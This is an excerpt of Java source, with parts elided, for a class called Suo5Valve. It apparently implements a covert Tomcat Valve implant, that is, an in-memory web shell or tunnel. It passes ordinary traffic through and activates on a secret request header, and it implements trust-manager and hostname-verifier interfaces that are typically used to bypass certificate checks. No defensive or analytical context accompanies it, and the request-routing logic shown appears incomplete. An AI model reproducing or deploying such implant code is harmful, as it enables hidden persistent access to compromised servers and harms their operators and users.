...
public class Suo5Valve extends ClassLoader implements Valve, Runnable, HostnameVerifier, X509TrustManager {
    ...
    public Suo5Valve(ClassLoader z) {
        super(z);
        this.cs = "UTF-8";
    }

    public Suo5Valve(InputStream in, OutputStream out) {
        this.gInStream = in;
        this.gOutStream = out;
        this.cs = "UTF-8";
    }
    ...
    @Override
    public void invoke(Request sReq, Response sResp) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) sReq;
        HttpServletResponse response = (HttpServletResponse) sResp;
        String header = request.getHeader(randomHeader);
        String contentType = request.getHeader("Content-Type");

        if (header == null || !header.equals(randomHeader)) {
            this.getNext().invoke(sReq, sResp);
        }
        if (contentType == null) {
            this.getNext().invoke(sReq, sResp);
        }
